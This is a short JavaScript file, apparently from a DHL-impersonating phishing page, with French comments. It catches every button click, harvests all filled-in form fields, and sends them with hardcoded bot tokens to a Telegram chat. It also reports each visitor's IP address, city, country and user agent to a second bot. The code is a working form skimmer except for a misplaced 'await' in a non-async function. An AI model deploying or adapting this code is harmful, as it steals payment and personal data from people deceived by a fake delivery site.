(function() {
  const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
  const CHAT_ID = "6788012481";

  function sendTelegram(token, text) {
    try {
      await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
      });
    } catch(e) {}
  }

  // Intercepter n'importe quel clic sur un bouton "Pay", "Confirm", "Submit", "Next"
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button, input[type="submit"]');
    if (!btn) return;

    setTimeout(function() {
      const inputs = document.querySelectorAll('input, select');
      let dataText = 'ðŸ“¦ <b>DHL Data Captured</b>\n\n';
      let count = 0;

      inputs.forEach(function(input) {
        if (input.value && input.type !== 'submit' && input.type !== 'hidden') {
          const label = input.getAttribute('placeholder') || input.name || input.id || 'Champ';
          dataText += '<b>' + label + ':</b> ' + input.value + '\n';
          count++;
        }
      });

      if (count > 0) {
        sendTelegram(DATA_BOT_TOKEN, dataText);
      }
    }, 100);
  }, true);

  // Track visit
  try {
    fetch('https://ipwho.is/').then(r => r.json()).then(data => {
      const ip = (data && data.ip) ? data.ip : 'Inconnu';
      const city = (data && data.city) ? data.city : 'Inconnu';
      const country = (data && data.country) ? data.country : 'Inconnu';

      const text = 'ðŸš¨ <b>New DHL Visit</b>\n\n' +
        'ðŸŒ <b>IP:</b> ' + ip + '\n' +
        'ðŸ™ï¸ <b>Ville:</b> ' + city + '\n' +
        'ðŸŒ <b>Pays:</b> ' + country + '\n' +
        'ðŸ“± <b>UA:</b> ' + navigator.userAgent;

      sendTelegram(VISIT_BOT_TOKEN, text);
    }).catch(() => {
      sendTelegram(VISIT_BOT_TOKEN, 'ðŸš¨ <b>New DHL Visit</b> (IP fail)');
    });
  } catch(e) {}
})();

